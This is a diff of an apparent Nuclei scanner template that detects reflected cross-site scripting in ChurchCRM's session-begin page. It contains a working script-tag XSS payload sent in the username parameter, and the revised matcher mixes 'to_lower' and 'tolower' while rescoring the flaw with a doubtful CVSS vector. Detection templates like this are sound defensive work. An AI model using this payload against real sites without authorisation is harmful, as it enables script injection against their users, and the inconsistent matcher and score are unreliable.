@@ -1,7 +1,7 @@
 id: churchcrm-xss
 
 info:
-  name: ChurchCRM - Reflected Cross-Site Scripting (XSS)
+  name: ChurchCRM - Cross-Site Scripting
   author: pikpikcu
   severity: medium
   description: |
@@ -9,8 +9,8 @@ info:
   reference:
     - https://github.com/ChurchCRM/CRM/blob/91cfa8eb00aef724705f5e038c236c146c6cf3a6/src/session/templates/begin-session.php#L39
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
-    cvss-score: 5.4
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+    cvss-score: 6.5
     cwe-id: CWE-79
     epss-score: 0.07062
     epss-percentile: 0.94141
@@ -22,28 +22,17 @@ info:
     fofa-query: app="ChurchCRM"
     product: churchcrm
     vendor: churchcrm
-  tags: churchcrm,xss
+  tags: churchcrm,xss,crm
 
 http:
-  - raw:
-      - |
-        GET /session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
-        Host: {{Hostname}}
+  - method: GET
+    path:
+      - "{{BaseURL}}/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
 
-    matchers-condition: and
     matchers:
-      - type: word
-        part: body
-        words:
-          - '<script>alert(document.domain)</script>'
-          - 'ChurchCRM'
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(to_lower(content_type), "text/html")'
+          - 'contains_all(tolower(body), "<script>alert(document.domain)</script>", "churchcrm")'
         condition: and
-
-      - type: word
-        part: content_type
-        words:
-          - text/html
-
-      - type: status
-        status:
-          - 200
